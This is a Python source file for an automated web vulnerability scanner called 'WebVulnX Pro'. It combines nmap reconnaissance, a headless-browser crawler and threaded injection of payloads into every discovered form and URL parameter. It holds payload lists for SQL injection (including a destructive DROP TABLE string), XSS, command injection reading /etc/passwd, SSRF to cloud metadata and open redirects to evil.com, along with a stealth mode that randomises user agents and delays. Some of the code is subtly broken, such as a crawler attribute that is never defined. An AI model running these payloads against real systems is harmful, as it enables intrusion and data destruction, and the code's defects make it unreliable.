import requests
import time
import random
import os
import socket
import threading
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright
from nmapAutomator import NmapAutomator

# --- Configuration & Payloads ---
USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...", "..."]
SQL_PAYLOADS = ["'", '"', "\\", "' OR '1'='1", "\" OR \"1\"=\"1", "1' OR '1'='1' -- ", "1\" OR \"1\"=\"1\" -- ", "'; DROP TABLE users; --", "'; WAITFOR DELAY '00:00:05' --", "' AND SLEEP(5) -- ", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "';alert('XSS');//", "<svg onload=alert('XSS')>", "javascript:alert('XSS')", "-alert(1)-", "';alert(String.fromCharCode(88,83,83));//"]
COMMAND_PAYLOADS = ["; ls -la", "| whoami", "& id", "; cat /etc/passwd", "`ping -c 5 127.0.0.1`"]
SSRF_PAYLOADS = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "ftp://example.com"]
OPEN_REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com", "/\\evil.com"]

# --- Helper Functions ---
def get_random_headers(): return {'User-Agent': random.choice(USER_AGENTS)}

# --- Advanced Crawler ---
class AdvancedCrawler:
    def __init__(self, target_url, session, max_depth=2, stealth=True):
        self.target_url = target_url
        self.session = session
        self.max_depth = max_depth
        self.stealth = stealth
        self.visited_urls = set()
        self.discovered_urls = set()
        self.discovered_forms = []
        self.discovered_api_endpoints = set()

    def crawl(self):
        print(f"[*] Starting advanced crawl with Playwright on {self.target_url}")
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            
            def handle_request(request):
                if "api" in request.url or request.resource_type in ["xhr", "fetch"]:
                    self.discovered_api_endpoints.add(request.url.split('?')[0])
            
            page.on("request", handle_request)
            page.goto(self.target_url)
            time.sleep(3)

            self._recursive_crawl(page, self.target_url, self.max_depth)
            
            browser.close()
        
        return list(self.discovered_urls), self.discovered_forms, list(self.discovered_api_endpoints)

    def _recursive_crawl(self, page, current_url, depth):
        if depth <= 0 or current_url in self.visited_urls or self.stop_scan: return

        self.visited_urls.add(current_url)
        self.discovered_urls.add(current_url)
        
        if self.stealth:
            time.sleep(random.uniform(0.5, 1.5))

        content = page.content()
        soup = BeautifulSoup(content, 'html.parser')

        for form in soup.find_all('form'):
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(current_url, action)
            inputs = form.find_all('input', {'name': True})
            form_details = {'url': form_url, 'method': method, 'params': {i.get('name'): 'test' for i in inputs}}
            if form_details['params']:
                self.discovered_forms.append(form_details)

        for a_tag in soup.find_all('a', href=True):
            link = urljoin(current_url, a_tag['href'])
            if urlparse(link).netloc == urlparse(self.target_url).netloc:
                try:
                    page.goto(link)
                    self._recursive_crawl(page, link, depth - 1)
                except Exception as e:
                    print(f"[-] Error navigating to {link}: {e}")

# --- Main Scanner Class ---
class VulnerabilityScanner:
    def __init__(self, target_url, options, emit_callback):
        self.target_url = target_url
        self.options = options
        self.emit = emit_callback
        self.session = requests.Session()
        self.vulnerabilities = []
        self.stop_scan = False
        self.recon_results = {}

    def log(self, message, log_type="info"):
        self.emit('log', {'message': message, 'type': log_type})

    def run(self):
        self.log(f"--- WebVulnX Pro - Starting Automated Scan on {self.target_url} ---", "success")
        
        try:
            target_ip = socket.gethostbyname(self.target_url)
        except socket.gaierror:
            self.log(f"Could not resolve {self.target_url} to an IP. Aborting scan.", "error")
            return

        # --- Stage 1: Network Reconnaissance ---
        output_dir = f"recon_results/{target_ip}"
        automator = NmapAutomator(target_ip, output_dir, emit_callback=self.emit)
        
        self.recon_results = automator.run_automated_recon()
        if self.stop_scan: return

        # --- Stage 2: Web Vulnerability Scan ---
        self.log("--- Stage 2: Analyzing results for web services ---", "info")
        open_ports = self.recon_results.get("open_ports", [])
        web_ports = [80, 443, 8080, 8443, 8000, 3000, 5000, 9000]
        found_web_ports = [p for p in open_ports if p in web_ports]

        if not found_web_ports:
            self.log("No common web ports found. Skipping web vulnerability scan.", "warning")
            self.emit('scan_complete', {'target': self.target_url, 'vulnerabilities': self.vulnerabilities, 'recon_results': self.recon_results})
            return

        self.log(f"Found web ports: {', '.join(map(str, found_web_ports))}. Starting web vulnerability scan...", "success")
        
        for port in found_web_ports:
            if self.stop_scan: break
            protocol = 'https' if port in [443, 8443] else 'http'
            web_target = f"{protocol}://{target_ip}:{port}"
            self.log(f"[*] Scanning web target: {web_target}", "info")
            
            crawler = AdvancedCrawler(web_target, self.session, self.options.get('depth', 2))
            urls, forms, api_endpoints = crawler.crawl()
            self.log(f"[*] Discovered {len(urls)} URLs and {len(forms)} forms on {web_target}.", "info")

            self.log(f"[*] Starting vulnerability scans on {web_target}...", "info")
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = []
                for url in urls:
                    parsed_url = urlparse(url)
                    params = parse_qs(parsed_url.query)
                    if params:
                        futures.append(executor.submit(self._scan_endpoint, 'GET', url, params))
                for form in forms:
                    futures.append(executor.submit(self._scan_endpoint, form['method'], form['url'], form['params']))
                
                for future in as_completed(futures):
                    if self.stop_scan: break
                    result = future.result()
                    if result:
                        self.vulnerabilities.append(result)
                        self.emit('vulnerability_found', result)

        if not self.stop_scan:
            self.log("--- Full Automated Scan Complete ---", "success")
            self.emit('scan_complete', {'target': self.target_url, 'vulnerabilities': self.vulnerabilities, 'recon_results': self.recon_results})

    def _scan_endpoint(self, method, url, params):
        for param in params:
            for payload in SQL_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "SQL Injection", self._check_sqli)
                if vuln: return vuln
            for payload in XSS_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "Cross-Site Scripting (XSS)", self._check_xss)
                if vuln: return vuln
            for payload in COMMAND_PAYLOADS:
                vuln = self._test_payload(method, url, param, payload, "Command Injection", self._check_command)
                if vuln: return vuln
        return None

    def _test_payload(self, method, url, param, payload, vuln_type, check_func):
        test_params = {param: payload}
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=test_params, headers=get_random_headers(), timeout=15, verify=False)
            else:
                response = self.session.post(url, data=test_params, headers=get_random_headers(), timeout=15, verify=False)
            if check_func(response):
                return {"url": url, "param": param, "payload": payload, "type": vuln_type}
        except Exception as e:
            self.log(f"[-] Error during scan on {url}: {e}", "error")
        return None

    def _check_sqli(self, response): return any(err in response.text.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "microsoft ole db"]) or response.elapsed.total_seconds() > 4.5
    def _check_xss(self, response): return any(payload in response.text for payload in XSS_PAYLOADS)
    def _check_command(self, response): return any(out in response.text for out in ["uid=", "gid=", "root:", "www-data"]) or response.elapsed.total_seconds() > 4.5
